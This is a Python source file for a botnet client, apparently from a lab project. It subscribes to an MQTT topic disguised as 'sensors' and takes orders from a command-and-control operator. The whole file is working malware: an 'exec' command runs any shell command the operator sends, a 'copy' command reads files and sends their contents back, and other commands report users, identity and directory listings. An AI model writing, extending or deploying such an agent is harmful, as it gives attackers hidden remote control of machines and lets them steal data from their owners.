"""
Bot - MQTT C&C Agent using layered protocol stack.
"""
import subprocess
import os
import random
from protocol import ProtocolStack

# --- CONFIGURATION ---
BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025"
BOT_ID = f"sensor_{random.randint(1000, 9999)}"
SEND_INTERVAL = 1.0


def handle_message(message: dict):
    """Handle incoming messages from the protocol stack."""
    msg_type = message.get("type")
    target = message.get("target")
    sender = message.get("sender")
    
    # Only handle commands targeted at us
    if msg_type != "command":
        return
    if target != "ALL" and target != BOT_ID:
        return
    
    command = message.get("cmd")
    arg = message.get("arg", "")
    
    print(f"[*] Command received: {command} {arg}")
    output = execute_command(command, arg)
    
    # Send response
    stack.send(sender, "response", output=output)


def execute_command(command: str, arg: str) -> str:
    """Execute a command and return output."""
    try:
        if command == "ping":
            return "Pong"
        elif command == "w":
            return subprocess.getoutput("w")
        elif command == "ls":
            path = arg if arg else "."
            return subprocess.getoutput(f"ls -la {path}")
        elif command == "id":
            return subprocess.getoutput("id")
        elif command == "exec":
            return subprocess.getoutput(arg)
        elif command == "copy":
            if os.path.exists(arg):
                with open(arg, "r", errors='ignore') as f:
                    return f"FILE_START:{arg}:{f.read()}"
            else:
                return "File not found"
        else:
            return "Unknown Cmd"
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    # Create and start protocol stack
    stack = ProtocolStack(
        node_id=BOT_ID,
        broker=BROKER,
        port=PORT,
        topic=TOPIC,
        salt=SALT,
        send_interval=SEND_INTERVAL
    )
    
    # Register message handler
    stack.on_receive(handle_message)
    
    print(f"[*] Bot {BOT_ID} listening (sending every {SEND_INTERVAL}s)...")
    stack.start()
    
    try:
        # Keep running
        while True:
            pass
    except KeyboardInterrupt:
        stack.stop()
        print("\n[*] Bot stopped.")